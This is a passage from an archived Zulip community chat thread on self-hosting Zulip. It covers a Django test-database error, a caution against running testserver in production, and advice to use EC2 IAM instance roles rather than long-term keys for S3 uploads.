Type &#39;yes&#39; if you would like to try deleting the test database &#39;test_zulip&#39;, or &#39;no&#39; to cancel: yes
Destroying old test database for alias &#39;default&#39;...
Got an error recreating the test database: database &quot;test_zulip&quot; does not exist
</pre></div>



<a name="625440"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625440" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625440">(Aug 04 2018 at 00:31)</a>:</h4>
<p>but I assume that's just an env setup issue for now</p>



<a name="625441"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625441" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625441">(Aug 04 2018 at 00:32)</a>:</h4>
<p>ohhh going to use <code>zulip-current-venv</code></p>



<a name="625442"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625442" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625442">(Aug 04 2018 at 00:34)</a>:</h4>
<p>eh, that's probably django related. Will leave it be for now</p>



<a name="625449"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625449" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Tim Abbott <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625449">(Aug 04 2018 at 00:54)</a>:</h4>
<p>FWIW <code>manage.py testserver</code> isn't something I'd recommend running on a production system.</p>



<a name="625455"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625455" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625455">(Aug 04 2018 at 01:02)</a>:</h4>
<p>Good point</p>



<a name="638935"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/638935" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Baruch Lubinsky <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#638935">(Aug 27 2018 at 15:55)</a>:</h4>
<p>When hosting on EC2 and using S3 as a file upload backend, is it possible to use the IAM Instance Role rather than IAM Secret Key for authentication in S3?</p>



<a name="638944"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/638944" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Rana Tanveer <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#638944">(Aug 27 2018 at 16:45)</a>:</h4>
<p>you can and should use an IAM role to manage temporary credentials for applications that run on an EC2 instance. When you use a role, you don't have to distribute long-term credentials (such as a user name and password or access keys) to an EC2 instance</p>



<a name="638947"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/638947" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Baruch Lubinsky <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#638947">(Aug 27 2018 at 16:47)</a>:</h4>
<p>Thanks for your reply, I went ahead and tried, it looks to be working perfectly.</p>



<hr><p>Last updated: Oct 02 2023 at 04:38 UTC</p>
</html>